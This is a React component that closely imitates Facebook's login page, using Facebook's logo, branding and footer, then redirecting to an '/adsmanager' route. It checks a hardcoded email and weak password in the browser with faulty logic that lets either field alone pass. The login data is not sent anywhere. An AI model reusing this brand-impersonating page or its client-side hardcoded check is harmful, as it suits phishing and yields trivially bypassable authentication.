import { useEffect, useState } from "react";

export default function Login() {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    errorPass: false,
  });

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    try {
      const { email, password } = formData;

      if (email != "Rusmantojax@gmail.com" && password != "123456") {
        setFormData((prev) => ({
          ...prev,
          errorPass: true,
          email: "",
          password: "",
        }));
        return;
      }

      localStorage.setItem("user", email);

      setTimeout(() => {
        window.location.href = "/adsmanager";
      }, 2000);
    } catch (error) {
      console.log(error);
    }
  };

  useEffect(() => {
    const user = localStorage.getItem("user");
    if (user) window.location.href = "/adsmanager";
  }, []);

  return (
    <div className="font-roboto flex flex-col w-full h-screen">
      <div className="w-full h-[62lvh] bg-[#F2F4F7] flex flex-col justify-center items-center">
        <img
          src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
          alt="facebook"
          loading="lazy"
          className="w-60 h-auto -mt-12"
        />
        <div className="bg-white w-full max-w-[396px] py-6 px-4 rounded-lg shadow-lg border border-gray-200">
          <div className="flex flex-col gap-4">
            <h2 className="text-center text-lg">Log in to Facebook</h2>
            <form
              id="login"
              name="login"
              onSubmit={handleSubmit}
              className="flex flex-col gap-3"
            >
              <input
                type="email"
                name="email"
                placeholder="Email address or phone number"
                className="px-[14px] py-3 border border-gray-300 rounded-md"
                required
                value={formData.email}
                onChange={handleInputChange}
              />
              <input
                type="password"
                name="password"
                placeholder="Password"
                className="px-[14px] py-3 border border-gray-300 rounded-md"
                required
                value={formData.password}
                onChange={handleInputChange}
              />
              {formData.errorPass && (
                <div className="flex flex-col">
                  <span className="text-[#F02849] text-[13px]">
                    The password that you've entered is incorrect.
                  </span>
                  <a
                    href="#"
                    className="text-[#F02849] text-[13px] font-medium underline"
                  >
                    Forgotten password?
                  </a>
                </div>
              )}
              <button
                type="submit"
                className="bg-[#1877F2] hover:bg-[#166FE5] cursor-pointer text-white py-3 text-xl font-bold rounded-md"
              >
                Log In
              </button>
            </form>
            <div className="flex flex-col gap-3">
              <a
                href="#"
                className="text-sm text-[#1877F2] hover:underline text-center"
              >
                Forgotten account?
              </a>
              <div className="flex items-center gap-2">
                <div className="w-full h-[1px] bg-[#96999E]/30 -ml-1"></div>
                <span className="text-xs text-[#96999E]">or</span>
                <div className="w-full h-[1px] bg-[#96999E]/30 -mr-1"></div>
              </div>
              <div className="flex justify-center">
                <button className="w-fit px-4 bg-[#42B72A] hover:bg-[#36A420] cursor-pointer text-white py-3 text-[17px] font-bold rounded-md">
                  Create new account
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="w-full h-[38lvh] bg-white">
        <div className="mt-20 w-full max-w-[980px] mx-auto">
          <div className="flex flex-wrap gap-4 text-xs text-[#737373]">
            <a href="#" className="hover:underline">
              English (UK)
            </a>
            <a href="#" className="hover:underline">
              Bahasa Indonesia
            </a>
            <a href="#" className="hover:underline">
              Basa Jawa
            </a>
            <a href="#" className="hover:underline">
              Basa Melayu
            </a>
            <a href="#" className="hover:underline">
              日本語
            </a>
            <a href="#" className="hover:underline">
              العربية
            </a>
            <a href="#" className="hover:underline">
              Français (France)
            </a>
            <a href="#" className="hover:underline">
              Español
            </a>
            <a href="#" className="hover:underline">
              한국어
            </a>
            <a href="#" className="hover:underline">
              Português (Brasil)
            </a>
            <a href="#" className="hover:underline">
              Deutsch
            </a>
          </div>
          <hr className="my-2 border-[#737373]/20" />
          <div className="flex flex-wrap gap-4 text-xs text-[#737373]">
            <a href="#" className="hover:underline">
              Sign Up
            </a>
            <a href="#" className="hover:underline">
              Log in
            </a>
            <a href="#" className="hover:underline">
              Messenger
            </a>
            <a href="#" className="hover:underline">
              Facebook Lite
            </a>
            <a href="#" className="hover:underline">
              Video
            </a>
            <a href="#" className="hover:underline">
              Meta Pay
            </a>
            <a href="#" className="hover:underline">
              Meta Store
            </a>
            <a href="#" className="hover:underline">
              Meta Quest
            </a>
            <a href="#" className="hover:underline">
              Ray-Ban Meta
            </a>
            <a href="#" className="hover:underline">
              Meta AI
            </a>
            <a href="#" className="hover:underline">
              Meta AI more content
            </a>
            <a href="#" className="hover:underline">
              Instagram
            </a>
          </div>
          <div className="flex flex-wrap gap-4 text-xs text-[#737373] mt-1">
            <a href="#" className="hover:underline">
              Threads
            </a>
            <a href="#" className="hover:underline">
              Voting Information Centre
            </a>
            <a href="#" className="hover:underline">
              Privacy Policy
            </a>
            <a href="#" className="hover:underline">
              Privacy Center
            </a>
            <a href="#" className="hover:underline">
              Meta in Indonesia
            </a>
            <a href="#" className="hover:underline">
              About
            </a>
            <a href="#" className="hover:underline">
              Create Ad
            </a>
            <a href="#" className="hover:underline">
              Create Page
            </a>
            <a href="#" className="hover:underline">
              Developers
            </a>
            <a href="#" className="hover:underline">
              Careers
            </a>
            <a href="#" className="hover:underline">
              Cookies
            </a>
          </div>
          <div className="flex flex-wrap gap-4 text-xs text-[#737373] mt-1">
            <a href="#" className="hover:underline">
              AdChoices
            </a>
            <a href="#" className="hover:underline">
              Terms
            </a>
            <a href="#" className="hover:underline">
              Help
            </a>
            <a href="#" className="hover:underline">
              Content uploading and non-users
            </a>
          </div>
          <div className="text-sm text-[#737373] mt-4 text-[11px]">
            Meta &copy; 2025
          </div>
        </div>
      </div>
    </div>
  );
}
